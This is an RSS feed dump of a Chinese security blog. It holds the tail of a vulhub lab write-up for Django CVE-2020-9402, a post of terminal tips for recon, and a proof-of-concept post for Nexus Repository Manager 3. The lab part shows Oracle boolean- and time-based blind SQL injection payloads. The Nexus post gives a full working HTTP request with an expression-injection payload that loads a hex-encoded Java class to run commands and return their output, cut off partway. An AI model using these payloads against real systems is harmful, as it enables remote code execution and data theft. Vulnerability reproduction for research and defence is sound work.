+Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1991, 2014, Oracle.  All rights reserved.
+
+Connecting to &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;DESCRIPTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ADDRESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PROTOCOL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32b16e34b6c&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1521&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;
+The &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully
+Database has been created &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /u01/app/oracle/oradata/orcl
+SYS and SYSTEM passwords are &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;oracle]
+Setting HTTP port to 8080
+
+PL/SQL procedure successfully completed.
+
+Please login to http://&amp;lt;ip_address&amp;gt;:8080/em to use enterprise manager
+User: sys&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Password oracle&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Sysdba: &lt;span class=&quot;nb&quot;&gt;true
+&lt;/span&gt;Fixing permissions...
+Running init scripts...
+Init scripts &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /oracle.init.d/: Ignoring /oracle.init.d/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+
+Done with scripts we are ready to go
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;难道是因为db的原因导致web服务报错，而且恰好报错是oracle数据库的错，而又恰好我们看日志时是存在这样的情况的。返回去在看web虚拟机的日志，果然：db虚拟机数据库文件拷贝完成后，这边web虚拟机重启后启动服务就没有报错了，服务跑在8000端口。&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /usr/src
++ wait-for-it.sh &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 0 db:1521 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'oracle is up'&lt;/span&gt;
+wait-for-it.sh: waiting &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;db:1521 without a &lt;span class=&quot;nb&quot;&gt;timeout
+&lt;/span&gt;wait-for-it.sh: db:1521 is available after 0 seconds
+oracle is up
++ python manage.py makemigrations
+Migrations &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'vuln'&lt;/span&gt;:
+  vuln/migrations/0001_initial.py
+    - Create model Names
+    - Create model Collection
+    - Create model Collection2
++ python manage.py migrate
+Operations to perform:
+  Apply all migrations: admin, auth, contenttypes, sessions, vuln
+Running migrations:
+  Applying contenttypes.0001_initial... OK
+  Applying auth.0001_initial... OK
+  Applying admin.0001_initial... OK
+  Applying admin.0002_logentry_remove_auto_add... OK
+  Applying admin.0003_logentry_add_action_flag_choices... OK
+  Applying contenttypes.0002_remove_content_type_name... OK
+  Applying auth.0002_alter_permission_name_max_length... OK
+  Applying auth.0003_alter_user_email_max_length... OK
+  Applying auth.0004_alter_user_username_opts... OK
+  Applying auth.0005_alter_user_last_login_null... OK
+  Applying auth.0006_require_contenttypes_0002... OK
+  Applying auth.0007_alter_validators_add_error_messages... OK
+  Applying auth.0008_alter_user_username_max_length... OK
+  Applying auth.0009_alter_user_last_name_max_length... OK
+  Applying auth.0010_alter_group_name_max_length... OK
+  Applying auth.0011_update_proxy_permissions... OK
+  Applying sessions.0001_initial... OK
+  Applying vuln.0001_initial... OK
++ python manage.py loaddata collection.json
+Installed 8 object&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; from 1 fixture&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ python manage.py shell &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'from django.contrib.auth.models import User; User.objects.create_superuser('&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;', '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin@vulhub.org'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;', '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;') if not User.objects.filter(username='&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;').exists() else 0'&lt;/span&gt;
++ &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;python manage.py runserver 0.0.0.0:8000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;令人失望的结果&quot;&gt;#令人失望的结果&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec python manage.py runserver 0.0.0.0:8000&lt;/code&gt;看到这个日志打印出来，觉得好像确实没有什么问题了，再来查看一下docker的状态。&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro CVE-2020-9402 % docker-compose ps
+       Name                      Command               State              Ports            
+-------------------------------------------------------------------------------------------
+cve-2020-9402_db_1    /entrypoint.sh                   Up      1521/tcp, 5500/tcp, 8080/tcp
+cve-2020-9402_web_1   /docker-entrypoint.sh pyth ...   Up      0.0.0.0:8000-&amp;gt;8000/tcp    
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;看一眼docker的情况，都是up状态。访问一下8000端口终于也可以访问到web服务了，不再是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Empty reply from server&lt;/code&gt;了。&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro CVE-2020-9402 % curl localhost:8000
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&quot;en&quot;&amp;gt;
+&amp;lt;head&amp;gt;
+  &amp;lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot;&amp;gt;
+  &amp;lt;title&amp;gt;Page not found at /&amp;lt;/title&amp;gt;
+  &amp;lt;meta name=&quot;robots&quot; content=&quot;NONE,NOARCHIVE&quot;&amp;gt;
+  &amp;lt;style type=&quot;text/css&quot;&amp;gt;
+    html * { padding:0; margin:0; }
+    body * { padding:10px 20px; }
+    body * * { padding:0; }
+    body { font:small sans-serif; background:#eee; color:#000; }
+    body&amp;gt;div { border-bottom:1px solid #ddd; }
+    h1 { font-weight:normal; margin-bottom:.4em; }
+    h1 span { font-size:60%; color:#666; font-weight:normal; }
+    table { border:none; border-collapse: collapse; width:100%; }
+    td, th { vertical-align:top; padding:2px 3px; }
+    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
+    #info { background:#f6f6f6; }
+    #info ol { margin: 0.5em 4em; }
+    #info ol li { font-family: monospace; }
+    #summary { background: #ffc; }
+    #explanation { background:#eee; border-bottom: 0px none; }
+  &amp;lt;/style&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;web访问日志：&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Watching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;file changes with StatReloader
+Not Found: /
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;11/Sep/2020 07:01:23] &lt;span class=&quot;s2&quot;&gt;&quot;GET / HTTP/1.1&quot;&lt;/span&gt; 404 2137
+
+Not Found: /
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;11/Sep/2020 07:06:47] &lt;span class=&quot;s2&quot;&gt;&quot;GET / HTTP/1.1&quot;&lt;/span&gt; 404 2141
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+Parameter: q &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GET&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    Type: boolean-based blind
+    Title: Oracle boolean-based blind - Parameter replace
+    Payload: &lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;SELECT &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CASE WHEN &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;6457&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;6457&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; THEN 6457 ELSE CAST&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 AS INT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SELECT 0 FROM DUAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; END&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; FROM DUAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+    Type: time-based blind
+    Title: Oracle time-based blind - Parameter replace &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DBMS_PIPE.RECEIVE_MESSAGE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    Payload: &lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;SELECT &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CASE WHEN &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;6135&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;6135&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; THEN DBMS_PIPE.RECEIVE_MESSAGE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CHR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;83&lt;span class=&quot;o&quot;&gt;)||&lt;/span&gt;CHR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;74&lt;span class=&quot;o&quot;&gt;)||&lt;/span&gt;CHR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;88&lt;span class=&quot;o&quot;&gt;)||&lt;/span&gt;CHR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;115&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ELSE 6135 END&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; FROM DUAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:22:11] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] the back-end DBMS is Oracle
+back-end DBMS: Oracle
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Fri, 11 Sep 2020 00:00:00 +0800</pubDate>
+        <link> https://www.sentrylab.cn/blog/2020/docker/vuln/problems/</link>
+        <guid isPermaLink="true">/blog/2020/docker/vuln/problems/</guid>
+        
+        
+        <category>blog</category>
+        
+        <category>docker</category>
+        
+        <category>技巧</category>
+        
+        <category>Vulnhub</category>
+        
+        <category>笔记</category>
+        
+      </item>
+    
+      <item>
+        <title>blog: 「技巧」：linux&amp;unix Terminal小技巧</title>
+        <description>&lt;h1 id=&quot;grep&quot;&gt;grep&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;grep -n “get_spg2lsf” -r ./&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;在当前文件夹下查找包含”get_spg2lsf”字符串的文件&lt;/p&gt;
+
+&lt;h1 id=&quot;vim&quot;&gt;vim&lt;/h1&gt;
+
+&lt;h3 id=&quot;快速删除&quot;&gt;快速删除&lt;/h3&gt;
+&lt;p&gt;1、删除每行前10个字符：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;:%s/^.{10}//&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;其中，%表示所有行，s表示替换，”%s”可用”1,$”代替（下同）；&lt;/p&gt;
+
+&lt;p&gt;正则表达式”/^.{10}//”中，^表示行首；”.”表示要删除的字符个数，”.{10}“表示删除10个字符，可用10个”.”表示；&lt;/p&gt;
+
+&lt;p&gt;2、删除每行后10个字符&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;:%s/.{10}$//&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;字符串替换&quot;&gt;字符串替换&lt;/h3&gt;
+&lt;p&gt;vi/vim 中可以使用 :s 命令来替换字符串。&lt;/p&gt;
+
+&lt;p&gt;　　:s/vivian/sky/ 替换当前行第一个 vivian 为 sky&lt;/p&gt;
+
+&lt;p&gt;　　:s/vivian/sky/g 替换当前行所有 vivian 为 sky&lt;/p&gt;
+
+&lt;p&gt;　　:n,$s/vivian/sky/ 替换第 n 行开始到最后一行中每一行的第一个 vivian 为 sky&lt;/p&gt;
+
+&lt;p&gt;　　:n,$s/vivian/sky/g 替换第 n 行开始到最后一行中每一行所有 vivian 为 sky&lt;/p&gt;
+
+&lt;h1 id=&quot;awk&quot;&gt;awk&lt;/h1&gt;
+&lt;p&gt;在实际信息搜集过程中遇到的问题：&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;现在有一个hosts文件，其中包含了所需要信息搜集的域名和ip地址，其格式如下存储：
+domain.com.cn,1.1.1.1&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;首先按照信息搜集的方式第一步我是先过一遍ip或域名的端口，所以问题就来了。
+nmap不支持这种形式进行文件内容读取，需以一行一数据的形式，就是：&lt;/p&gt;
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cn1&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;ip1&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cn2&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;ip2&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;不管是域名还是ip地址都是以这样的形式来读取才能使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-iL&lt;/code&gt;参数来读取指定的域名或ip，最后实现我们的端口扫描任务，所以是需要以逗号为界限，将两列数据分成两个文件；&lt;/p&gt;
+
+&lt;p&gt;故我们构思一下思路：以逗号为标示，把前面一列和后面一列分别使用参数$1，$2来表示，将$1输出到domain1.txt，$2输出到domain2.txt中。&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 01 Sep 2020 00:00:00 +0800</pubDate>
+        <link> https://www.sentrylab.cn/blog/2020/use/vim/in/linux/</link>
+        <guid isPermaLink="true">/blog/2020/use/vim/in/linux/</guid>
+        
+        
+        <category>blog</category>
+        
+        <category>笔记</category>
+        
+        <category>BASH</category>
+        
+        <category>信息搜集</category>
+        
+      </item>
+    
+      <item>
+        <title>blog: 「Src」：Nexus-Repository-Manager3-漏洞复现总结</title>
+        <description>&lt;p&gt;只是简单记录一下关于这个管理软件的poc代码；&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /service/extdirect HTTP/1.1
+Host: vuln_ip
+sUser-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Macintosh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Intel Mac OS X 10.15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rv:79.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Gecko/20100101 Firefox/79.0
+Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,image/webp,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8
+Accept-Language: zh-CN,zh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8,zh-TW&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.7,zh-HK&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.5,en-US&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.3,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.2
+Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/json&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UTF-8
+Content-Length: 7249
+
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;action&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;coreui_Component&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;rpc&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;tid&quot;&lt;/span&gt;: 8, &lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sort&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;direction&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;ASC&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;property&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;: 0, &lt;span class=&quot;s2&quot;&gt;&quot;filter&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;property&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;repositoryName&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;value&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;*&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;property&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;expression&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;value&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;function(x, y, z, c, integer, defineClass){   c=1.class.forName('java.lang.Character');   integer=1.class;   x='CAFEBABE0000003100AE0A001F00560A005700580A005700590A005A005B0A005A005C0A005D005E0A005D005F0700600A000800610A006200630700640800650A001D00660800410A001D00670A006800690A0068006A08006B08004508006C08006D0A006E006F0A006E00700A001F00710A001D00720800730A000800740800750700760A001D00770700780A0079007A08007B08007C07007D0A0023007E0A0023007F0700800100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100114C4578706C6F69742F546573743233343B01000474657374010015284C6A6176612F6C616E672F537472696E673B29560100036F626A0100124C6A6176612F6C616E672F4F626A6563743B0100016901000149010003636D640100124C6A6176612F6C616E672F537472696E673B01000770726F636573730100134C6A6176612F6C616E672F50726F636573733B01000269730100154C6A6176612F696F2F496E70757453747265616D3B010006726573756C740100025B42010009726573756C745374720100067468726561640100124C6A6176612F6C616E672F5468726561643B0100056669656C640100194C6A6176612F6C616E672F7265666C6563742F4669656C643B01000C7468726561644C6F63616C7301000E7468726561644C6F63616C4D61700100114C6A6176612F6C616E672F436C6173733B01000A7461626C654669656C640100057461626C65010005656E74727901000A76616C75654669656C6401000E68747470436F6E6E656374696F6E01000E48747470436F6E6E656374696F6E0100076368616E6E656C01000B487474704368616E6E656C010008726573706F6E7365010008526573706F6E73650100067772697465720100154C6A6176612F696F2F5072696E745772697465723B0100164C6F63616C5661726961626C65547970655461626C650100144C6A6176612F6C616E672F436C6173733C2A3E3B01000A457863657074696F6E7307008101000A536F7572636546696C6501000C546573743233342E6A6176610C002700280700820C008300840C008500860700870C008800890C008A008B07008C0C008D00890C008E008F0100106A6176612F6C616E672F537472696E670C002700900700910C009200930100116A6176612F6C616E672F496E74656765720100106A6176612E6C616E672E5468726561640C009400950C009600970700980C0099009A0C009B009C0100246A6176612E6C616E672E5468726561644C6F63616C245468726561644C6F63616C4D617001002A6A6176612E6C616E672E5468726561644C6F63616C245468726561644C6F63616C4D617024456E74727901000576616C756507009D0C009E009F0C009B00A00C00A100A20C00A300A40100276F72672E65636C697073652E6A657474792E7365727665722E48747470436F6E6E656374696F6E0C00A500A601000E676574487474704368616E6E656C01000F6A6176612F6C616E672F436C6173730C00A700A80100106A6176612F6C616E672F4F626A6563740700A90C00AA00AB01000B676574526573706F6E73650100096765745772697465720100136A6176612F696F2F5072696E745772697465720C00AC002F0C00AD002801000F4578706C6F69742F546573743233340100136A6176612F6C616E672F457863657074696F6E0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000777616974466F7201000328294901000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B0100136A6176612F696F2F496E70757453747265616D010009617661696C61626C6501000472656164010007285B4249492949010005285B4229560100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010007666F724E616D65010025284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F436C6173733B0100106765744465636C617265644669656C6401002D284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F7265666C6563742F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C6401000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100176A6176612F6C616E672F7265666C6563742F41727261790100096765744C656E677468010015284C6A6176612F6C616E672F4F626A6563743B2949010027284C6A6176612F6C616E672F4F626A6563743B49294C6A6176612F6C616E672F4F626A6563743B010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B0100076765744E616D6501001428294C6A6176612F6C616E672F537472696E673B010006657175616C73010015284C6A6176612F6C616E672F4F626A6563743B295A0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100057772697465010005636C6F736500210026001F000000000002000100270028000100290000002F00010001000000052AB70001B100000002002A00000006000100000009002B0000000C000100000005002C002D00000009002E002F0002002900000304000400140000013EB800022AB600034C2BB60004572BB600054D2CB60006BC084E2C2D032CB60006B6000757BB0008592DB700093A04B8000A3A05120B57120CB8000D120EB6000F3A06190604B6001019061905B600113A07120B571212B8000D3A0819081213B6000F3A09190904B6001019091907B600113A0A120B571214B8000D3A0B190B1215B6000F3A0C190C04B60010013A0D03360E150E190AB80016A2003E190A150EB800173A0F190FC70006A70027190C190FB600113A0D190DC70006A70016190DB60018B60019121AB6001B990006A70009840E01A7FFBE190DB600183A0E190E121C03BD001DB6001E190D03BD001FB600203A0F190FB600183A101910122103BD001DB6001E190F03BD001FB600203A111911B600183A121912122203BD001DB6001E191103BD001FB60020C000233A1319131904B600241913B60025B100000003002A0000009600250000001600080017000D0018001200190019001A0024001B002E001D0033001F004200200048002100510023005B002500640026006A002700730029007D002A0086002B008C002D008F002F009C003100A5003200AA003300AD003500B6003600BB003700BE003900CE003A00D1002F00D7003D00DE003E00F4003F00FB004001110041011800420131004401380045013D0049002B000000DE001600A5002C00300031000F0092004500320033000E0000013E003400350000000801360036003700010012012C00380039000200190125003A003B0003002E0110003C003500040033010B003D003E0005004200FC003F00400006005100ED004100310007005B00E3004200430008006400DA004400400009007300CB00450031000A007D00C100460043000B008600B800470040000C008F00AF00480031000D00DE006000490043000E00F4004A004A0031000F00FB0043004B004300100111002D004C0031001101180026004D004300120131000D004E004F00130050000000340005005B00E3004200510008007D00C100460051000B00DE006000490051000E00FB0043004B0051001001180026004D005100120052000000040001005300010054000000020055';   y=0;   z='';   while (y lt x.length()){       z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0];       y += 2;   };defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;defineClass.setAccessible(true);&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x=defineClass.invoke(&lt;/span&gt;&lt;span 